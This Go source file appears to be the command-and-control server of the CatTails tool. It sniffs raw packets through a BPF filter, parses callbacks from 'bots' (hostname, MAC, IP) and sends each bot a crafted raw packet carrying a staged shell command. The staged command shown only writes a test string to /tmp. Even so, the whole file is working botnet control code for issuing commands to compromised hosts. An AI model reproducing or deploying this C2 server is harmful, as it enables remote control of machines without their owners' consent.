package main

import (
	"fmt"
	"log"
	"net"
	"strings"

	"github.com/google/gopacket"
	"github.com/oneNutW0nder/CatTails/cattails"
	"golang.org/x/sys/unix"
)

var stagedCmd = "echo 'hello from cattails' > /tmp/cattails"

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
}

// sendCommand takes
func sendCommand(iface *net.Interface, src net.IP, listen chan Host) {

	// Forever loop to respond to bots
	for {
		bot := <-listen
		fd := cattails.NewSocket()
		// Create packet
		packet := cattails.CreatePacket(iface, src, bot.IP, bot.Mac, cattails.CreateCommand(stagedCmd))
		fmt.Println("Repsonding to:", bot)

		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)

		fmt.Println("Sent reponse sent")
		unix.Close(fd)
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	data := string(packet.ApplicationLayer().Payload())

	payload := strings.Split(data, " ")
	fmt.Println("Payload:", payload)

	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		log.Fatal(err)
	}

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
	}

	fmt.Println("My host:", newHost)
	listen <- newHost
}

func main() {

	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	readfd := cattails.NewSocket()
	fmt.Println("Created sockets")
	defer unix.Close(readfd)

	// Make channel
	listen := make(chan Host)

	// Iface and src ip for the sendcommand func to use
	iface, src := cattails.GetOutwardIface("8.8.8.8:80")

	// Spawn routine to listen for responses
	fmt.Println("Starting go routine...")
	go sendCommand(iface, src, listen)

	fmt.Println("Entering recieve loop")

	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
